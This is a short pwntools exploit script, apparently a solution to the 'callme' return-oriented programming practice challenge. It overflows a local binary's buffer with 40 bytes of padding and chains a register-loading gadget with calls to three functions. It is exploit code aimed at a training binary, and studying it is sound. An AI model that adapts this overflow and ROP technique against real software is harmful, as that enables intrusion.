from pwn import *

context(terminal=["tmux", "new-window"])

#p = gdb.debug("./callme", gdbscript='''
#init-peda
#b *0x401a47
#''')
p = process("./callme")
elf = ELF("./callme")
rop = ROP(elf)

callme_one = p64(0x401850) # rabin2 -i callme
callme_two = p64(0x401870)
callme_three = p64(0x401810)

gadget = p64(0x401ab0)
one = p64(1)
two = p64(2)
three = p64(3)
func = gadget + one + two + three

# https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
# here we see that the order is rdi, rsi ,rdx
junk = "A"*40

payload = junk + func + callme_one + func + callme_two + func +  callme_three

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
